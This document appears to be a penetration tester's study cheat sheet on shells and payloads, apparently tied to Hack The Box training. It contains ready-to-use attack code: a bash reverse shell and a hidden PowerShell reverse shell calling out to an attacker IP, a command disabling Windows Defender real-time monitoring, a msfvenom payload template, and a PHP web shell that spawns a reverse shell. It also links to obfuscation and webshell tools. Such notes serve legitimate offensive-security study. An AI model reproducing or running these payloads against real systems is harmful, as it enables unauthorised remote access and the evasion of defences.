# Shells & Payloads

## Reverse shell

Linux -> bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

Windows ->&#x20;

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell-session
Set-MpPreference -DisableRealtimeMonitoring $true
```

## MSFvemon

msfvenom -l payloads

linux pipes to .elf

windows pipes to .exe

Comand is:  msfvenom -p \<PATH\_TO\_ EXPLOIT> LHOST=\<IP> LPORT=\<PORT> -f \<elf/exe> > \<OUT>

## Payloads

* [https://swisskyrepo.github.io/PayloadsAllTheThings/](https://swisskyrepo.github.io/PayloadsAllTheThings/) - Good resource for payloads
* [https://github.com/bats3c/darkarmour](https://github.com/bats3c/darkarmour) - Good for obfuscated windows binaries
* msfvenom - See above

Msfconsole is a very easy tool and makes things very automated! Use search to look for exploits

Shell upgrades in the case of no python [here](https://academy.hackthebox.com/module/115/section/1117)

## Web shells

Laudanum - Come with installed ready to go web exploits only works on very easy targets. You do have to do some manual configuration. Like adding your local ip to the allowed list.

## Antak & IPPSEC

[https://ippsec.rocks/](https://ippsec.rocks/) -> Is a great resource for learning and checking out new technologies he may have spoken about.

```
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.25/9000 0>&1'"); ?>
```

## Nishang

Come with a bunch on compiled payloads for different atack surfaces. Antak is themed like powershell and used for windows shells

## PHP webshells

[winterWolf](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) -> nice one for php webshells provides clear stuff

